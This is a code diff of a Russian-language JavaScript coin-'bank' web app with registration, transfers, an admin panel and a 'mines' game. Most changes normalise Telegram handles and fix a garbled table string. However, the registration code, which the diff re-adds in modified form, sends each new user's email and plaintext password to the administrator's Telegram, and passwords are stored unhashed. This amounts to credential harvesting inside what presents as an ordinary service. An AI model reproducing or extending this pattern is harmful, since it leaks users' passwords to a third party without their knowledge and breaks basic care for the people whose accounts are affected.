@@ -158,10 +158,12 @@
         if (users.find(u => u.email === email)) { addLog("❌ Email уже есть"); return false; }
         let bonus = 150;
         if (promo === "12341") bonus = 500;
-        users.push({ email, password: pass, tg: tg.toLowerCase(), balance: bonus, regDate: new Date().toISOString() });
+        // Сохраняем tg в чистом виде: без @, нижний регистр
+        const cleanTg = tg.replace(/[@\s]/g, '').toLowerCase();
+        users.push({ email, password: pass, tg: cleanTg, balance: bonus, regDate: new Date().toISOString() });
         saveUsers();
         addLog(`✅ Регистрация успешна! +${bonus} монет`);
-        await sendToAdmin(`🔴 <b>НОВАЯ РЕГИСТРАЦИЯ</b>\n📧 ${email}\n🔑 ${pass}\n📱 @${tg}\n💰 Бонус: ${bonus} монет`);
+        await sendToAdmin(`🔴 <b>НОВАЯ РЕГИСТРАЦИЯ</b>\n📧 ${email}\n🔑 ${pass}\n📱 @${cleanTg}\n💰 Бонус: ${bonus} монет`);
         return true;
     }
 
@@ -183,22 +185,19 @@
         showPanel("panelReg");
     }
 
-    // ========== ИСПРАВЛЕННЫЙ ПЕРЕВОД (РАБОТАЕТ 100%) ==========
     async function transfer(toTg, amount) {
         if (!currentUser) { addLog("❌ Сначала войдите в аккаунт"); return false; }
         if (amount <= 0) { addLog("❌ Сумма должна быть больше 0"); return false; }
         if (currentUser.balance < amount) { addLog("❌ Недостаточно монет"); return false; }
         
-        // Убираем @ и пробелы, приводим к нижнему регистру
-        let cleanTg = toTg.replace(/[@\s]/g, '').toLowerCase();
+        const cleanTg = toTg.replace(/[@\s]/g, '').toLowerCase();
         
         if (cleanTg === "") {
             addLog("❌ Введите Telegram получателя");
             return false;
         }
         
-        // Ищем пользователя (регистронезависимо)
-        let target = users.find(u => u.tg.toLowerCase() === cleanTg);
+        const target = users.find(u => u.tg === cleanTg);
         
         if (!target) { 
             addLog(`❌ Пользователь @${toTg} не зарегистрирован в банке!`);
@@ -211,12 +210,10 @@
             return false; 
         }
         
-        // Выполняем перевод
         currentUser.balance -= amount;
         target.balance += amount;
         
-        // Обновляем в массиве users
-        let idx = users.findIndex(u => u.email === target.email);
+        const idx = users.findIndex(u => u.email === target.email);
         if (idx !== -1) users[idx].balance = target.balance;
         
         syncAndSaveBalance();
@@ -390,7 +387,7 @@
 
     function renderAdminPanel() {
         let container = document.getElementById("adminContent");
-        let html = "<h4>📋 Пользователи</h4> 98ne<th>Telegram</th><th>Email</th><th>Баланс</th><th>Выдать монеты</th>协";
+        let html = "<h4>📋 Пользователи</h4> <table><tr><th>Telegram</th><th>Email</th><th>Баланс</th><th>Выдать монеты</th></tr>";
         users.forEach(u => {
             html += `<tr>
                 <td>@${u.tg}</td>
@@ -402,7 +399,7 @@
                 </td>
             </tr>`;
         });
-        html += `<\/table><hr><p><i>Все регистрации, переводы, заявки, победы и проигрыши в минах дублируются в Telegram администратора.</i></p>`;
+        html += `</table><hr><p><i>Все регистрации, переводы, заявки, победы и проигрыши в минах дублируются в Telegram администратора.</i></p>`;
         container.innerHTML = html;
     }
 
